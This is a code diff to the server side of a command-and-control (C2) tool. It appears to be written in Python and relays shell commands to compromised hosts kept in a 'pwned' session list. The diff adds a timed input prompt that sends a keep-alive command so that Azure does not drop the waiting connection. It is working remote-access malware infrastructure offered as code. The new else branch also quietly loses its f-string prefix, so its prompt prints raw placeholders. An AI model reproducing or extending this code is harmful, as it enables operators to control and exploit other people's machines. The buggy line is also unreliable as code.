@@ -4,7 +4,9 @@ C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
+    CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from inputimeout import inputimeout, TimeoutOccurred
 
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
@@ -34,7 +36,14 @@ class C2Handler(BaseHTTPRequestHandler):
 
             # interactive session with client
             elif client == pwned_dict[active_session]:
-                cmd = input(f"{client_account}@{client_hostname}:{cwd}$ ")
+                if INPUT_TIMEOUT:
+                    # Azure kills waiting HTTP GET session after 4 min, so must handle input with a timeout
+                    try:
+                        cmd = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)
+                    except TimeoutOccurred:
+                        cmd = KEEP_ALIVE_CMD
+                else:
+                    cmd = input("{client_account}@{client_hostname}:{cwd}$ ")
                 try:
                     self.http_response(HTTPStatusCode.OK.value)
                     # passing back command to client; must be utf-8 encode
